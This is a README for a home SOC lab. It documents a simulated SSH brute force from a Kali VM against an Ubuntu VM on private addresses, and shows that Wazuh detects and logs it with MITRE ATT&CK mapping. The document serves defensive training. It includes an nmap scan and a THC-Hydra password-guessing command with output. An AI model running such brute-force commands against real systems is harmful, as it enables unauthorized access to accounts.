# 🔐 SSH Brute Force Attack – Simulation

## 📌 Overview
This lab simulates an SSH brute force attack from a Kali Linux attacker machine against a monitored Ubuntu endpoint.
The objective is to generate authentication failure and success events and validate detection and alerting in **Wazuh** within a controlled SOC lab environment.

> ⚠️ Disclaimer  
> This activity was performed in an isolated lab environment for educational and defensive security purposes only.

---

## 🎯 Objective
- Simulate an SSH brute force attack
- Generate multiple failed authentication attempts
- Achieve a successful SSH login
- Validate SOC detections and MITRE ATT&CK mapping in Wazuh

---

## 🛠️ Tools Used
- Kali Linux
- THC-Hydra
- Nmap
- OpenSSH
- Wazuh (Agent, Manager, Dashboard)

---

## 🧠 Attack Scenario
The attacker performed a credential brute force attack against the SSH service running on the Ubuntu endpoint.
The attack resulted in multiple failed authentication attempts followed by a successful login.
All activity was logged and detected by Wazuh.

---

## 👨‍💻 Attacker Details
- Machine: Kali Linux VM
- IP Address: 10.0.0.226

---

## 🎯 Target Details
- Machine: Ubuntu Endpoint VM
- IP Address: 10.0.0.95
- Service: SSH
- Port: 22

---

## 🔍 Reconnaissance & Attack Execution (Terminal Evidence)

```bash
# Nmap scan to identify SSH service
nmap -p 22 10.0.0.95

PORT   STATE SERVICE
22/tcp open  ssh

# SSH brute force attack using THC-Hydra
hydra -l ubuntu -P passwords.txt ssh://10.0.0.95

[22][ssh] host: 10.0.0.95  login: ubuntu  password: ********
1 of 1 target successfully completed, valid password found
📊 Detection & Logging
Failed and successful SSH login attempts were logged on the Ubuntu endpoint

Logs were forwarded to the Wazuh manager

Alerts were correlated and displayed in the Wazuh dashboard under Threat Hunting → Events

🧩 MITRE ATT&CK Mapping
Technique ID	Name
T1110	Brute Force

📸 Evidence
Screenshots captured during the lab execution:

Nmap SSH Scan
screenshots/nmap_scan_ubuntu.png

Hydra Brute Force Attack
screenshots/hydra_bruteforce.png

Wazuh SSH Authentication Failures
screenshots/wazuh_ssh_failed_events.png

✅ Conclusion
This lab demonstrates how SSH brute force attacks generate identifiable authentication patterns.
Wazuh successfully detected, logged, and correlated the attack activity, validating its effectiveness for SOC monitoring, threat detection, and incident investigation.
